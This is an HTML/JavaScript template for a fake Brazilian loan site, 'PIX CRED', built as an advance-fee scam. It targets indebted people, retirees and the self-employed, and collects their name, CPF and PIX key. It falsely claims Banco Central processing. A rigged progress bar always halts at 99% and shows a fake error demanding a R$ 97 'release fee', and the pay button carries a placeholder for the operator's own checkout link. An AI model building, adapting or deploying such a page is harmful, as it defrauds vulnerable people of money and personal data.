<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PIX CRED - Sistema de Liberação</title>
    <style>
        :root { --primary: #004a8d; --secondary: #00d35d; --text: #333; }
        body { font-family: 'Segoe UI', sans-serif; background-color: #f4f7fa; margin: 0; display: flex; justify-content: center; }
        .app-container { width: 100%; max-width: 500px; background: white; min-height: 100vh; position: relative; display: flex; flex-direction: column; }
        
        /* Header */
        .header { padding: 15px; display: flex; align-items: center; background: white; border-bottom: 1px solid #eee; }
        .logo { color: var(--primary); font-weight: 900; font-size: 22px; letter-spacing: -1px; }

        /* Carrossel Superior */
        .carousel { background: var(--primary); color: white; padding: 10px; height: 40px; overflow: hidden; position: relative; text-align: center; }
        .carousel-track { position: absolute; width: 100%; animation: slide 9s infinite; }
        .carousel-item { height: 40px; display: flex; align-items: center; justify-content: center; font-size: 13px; font-weight: 300; }
        @keyframes slide { 
            0%, 30% { top: 0; }
            33%, 63% { top: -40px; }
            66%, 96% { top: -80px; }
            100% { top: 0; }
        }

        .content { padding: 25px; flex-grow: 1; }
        .step { display: none; }
        .step.active { display: block; animation: fadeIn 0.4s; }

        /* Estilo dos Grupos de Opções */
        .option-card { border: 2px solid #eee; padding: 15px; border-radius: 12px; margin-bottom: 10px; cursor: pointer; transition: 0.3s; display: flex; justify-content: space-between; align-items: center; }
        .option-card:hover { border-color: var(--secondary); background: #f0fff4; }
        .option-card h4 { margin: 0; color: var(--text); }

        /* Inputs Modernos */
        input, select { width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 10px; font-size: 16px; margin-top: 10px; outline: none; }
        input:focus { border-color: var(--primary); }

        .btn { background: var(--secondary); color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 20px; }

        /* Loading e Erro */
        .progress-box { margin-top: 30px; }
        .bar-bg { background: #eee; height: 12px; border-radius: 6px; overflow: hidden; }
        .bar-fill { width: 0%; height: 100%; background: var(--secondary); transition: 0.1s; }
        .error-msg { color: #d32f2f; background: #ffebee; padding: 15px; border-radius: 10px; margin-top: 20px; display: none; font-size: 14px; border: 1px solid #ffcdd2; }

        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

<div class="app-container">
    <div class="header">
        <div class="logo">PIX<span style="color:var(--secondary)">CRED</span></div>
    </div>

    <div class="carousel">
        <div class="carousel-track">
            <div class="carousel-item">1. Solicitação de Crédito em 2 min</div>
            <div class="carousel-item">2. Análise Instantânea Banco Central</div>
            <div class="carousel-item">3. Recebimento via PIX Imediato</div>
        </div>
    </div>

    <div class="content">
        
        <div id="step1" class="step active">
            <h2 style="margin-top:0">Selecione seu perfil:</h2>
            <div class="option-card" onclick="goToStep(2)"><div><h4>Negativados / Nome Sujo</h4><small>Liberação sem consulta SPC</small></div> ➔</div>
            <div class="option-card" onclick="goToStep(2)"><div><h4>Aposentados e Pensionistas</h4><small>Taxas reduzidas de 1.2% a.m</small></div> ➔</div>
            <div class="option-card" onclick="goToStep(2)"><div><h4>Autônomos / CPF Comum</h4><small>Liberação via Score Social</small></div> ➔</div>
        </div>

        <div id="step2" class="step">
            <h2>Qual seu nome completo?</h2>
            <input type="text" id="nome" placeholder="Digite seu nome...">
            <button class="btn" onclick="goToStep(3)">CONTINUAR</button>
        </div>

        <div id="step3" class="step">
            <h2>Informe seu CPF</h2>
            <p style="color:#777">Usaremos apenas para consulta de margem.</p>
            <input type="tel" id="cpf" placeholder="000.000.000-00" oninput="maskCPF(this)">
            <button class="btn" onclick="goToStep(4)">VERIFICAR CRÉDITO</button>
        </div>

        <div id="step4" class="step">
            <h2>Escolha o parcelamento</h2>
            <p>Carência de <b>180 dias</b> para começar a pagar.</p>
            <div class="option-card" onclick="goToStep(5)"><div><h4>12x sem juros</h4><small>Parcelas fixas no boleto</small></div> 🟢</div>
            <div class="option-card" onclick="goToStep(5)"><div><h4>24x com carência</h4><small>Primeira em Agosto/2026</small></div> 🟢</div>
            <div class="option-card" onclick="goToStep(5)"><div><h4>48x fixas</h4><small>Débito em conta ou boleto</small></div> 🟢</div>
        </div>

        <div id="step5" class="step">
            <h2>Termos de Adesão</h2>
            <div style="height: 150px; overflow-y: scroll; border: 1px solid #ddd; padding: 10px; font-size: 12px; color: #666; background: #fafafa; border-radius: 8px;">
                <p>Ao prosseguir, você concorda com a abertura de conta técnica para repasse de valores via sistema PIX CRED. O contrato prevê a isenção de juros nos primeiros 6 meses. O tomador declara estar ciente de que tarifas bancárias de transferência (TED/DOC) para valores acima de R$ 5.000,00 podem ser aplicadas conforme resolução vigente do Banco Central.</p>
                <p>O não pagamento da taxa de adesão implica no cancelamento automático da proposta de crédito aprovada.</p>
            </div>
            <label style="display: flex; align-items: center; margin-top: 15px; font-size: 14px;">
                <input type="checkbox" id="aceito" style="width: 20px; margin-right: 10px; margin-top: 0;"> Li e aceito os termos.
            </label>
            <button class="btn" onclick="validarTermo()">CONCORDAR E CONTINUAR</button>
        </div>

        <div id="step6" class="step">
            <h2>Onde deseja receber?</h2>
            <select id="banco">
                <option>Selecione seu Banco...</option>
                <option>Nubank</option>
                <option>Itaú</option>
                <option>Bradesco</option>
                <option>Banco do Brasil</option>
                <option>Caixa Econômica</option>
                <option>Santander</option>
                <option>Inter / C6 Bank</option>
            </select>
            <input type="text" placeholder="Chave PIX (CPF, Celular ou E-mail)">
            <button class="btn" onclick="startFinalProcess()">SOLICITAR ENVIO AGORA</button>
        </div>

        <div id="step7" class="step">
            <h2 id="finalTitle">Enviando seu PIX...</h2>
            <p id="finalSub">Não feche esta página.</p>
            
            <div class="progress-box">
                <div class="bar-bg"><div class="bar-fill" id="finalBar"></div></div>
                <p id="percentText" style="font-weight: bold; margin-top: 10px;">0%</p>
            </div>

            <div id="boxErro" class="error-msg">
                <b>⚠️ ERRO NO PROCESSAMENTO (Cód: 403)</b><br><br>
                Identificamos que sua conta requer uma <b>Taxa de Liberação de TED (Tarifa TAC)</b> no valor de <b>R$ 97,00</b> para concluir o envio de R$ 5.000,00.<br><br>
                Este valor é reembolsado automaticamente após o recebimento do empréstimo.
                <button class="btn" style="background: #d32f2f;" onclick="irCheckout()">PAGAR TAXA E LIBERAR AGORA</button>
            </div>
        </div>

    </div>

    <div style="text-align:center; padding: 20px; font-size: 10px; color: #aaa;">
        SISTEMA NACIONAL DE ATIVOS - CNPJ: 65.005.947/0001-30<br>
        Processado por Banco Central do Brasil
    </div>
</div>

<script>
    function goToStep(n) {
        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
        document.getElementById('step' + n).classList.add('active');
        window.scrollTo(0,0);
    }

    function maskCPF(i) {
        let v = i.value.replace(/\D/g, "");
        v = v.replace(/(\d{3})(\d)/, "$1.$2");
        v = v.replace(/(\d{3})(\d)/, "$1.$2");
        v = v.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
        i.value = v;
    }

    function validarTermo() {
        if(document.getElementById('aceito').checked) { goToStep(6); } 
        else { alert("Você precisa aceitar os termos."); }
    }

    function startFinalProcess() {
        goToStep(7);
        let bar = document.getElementById('finalBar');
        let txt = document.getElementById('percentText');
        let title = document.getElementById('finalTitle');
        let val = 0;

        let interval = setInterval(() => {
            val += 1;
            if(val <= 99) {
                bar.style.width = val + "%";
                txt.innerText = val + "%";
            }

            if(val == 30) title.innerText = "Autenticando com o Banco...";
            if(val == 60) title.innerText = "Preparando transferência PIX...";
            if(val == 85) title.innerText = "Aguardando assinatura digital...";

            if(val == 99) {
                clearInterval(interval);
                setTimeout(() => {
                    bar.style.background = "#d32f2f";
                    title.innerText = "PENDÊNCIA ENCONTRADA";
                    title.style.color = "#d32f2f";
                    document.getElementById('boxErro').style.display = "block";
                    document.getElementById('finalSub').style.display = "none";
                }, 1500);
            }
        }, 120); // Velocidade do carregamento
    }

    function irCheckout() {
        // COLOQUE SEU LINK DA INFINITEPAY OU CHECKOUT ABAIXO
        window.location.href = "SEU_LINK_AQUI";
    }
</script>

</body>
</html>
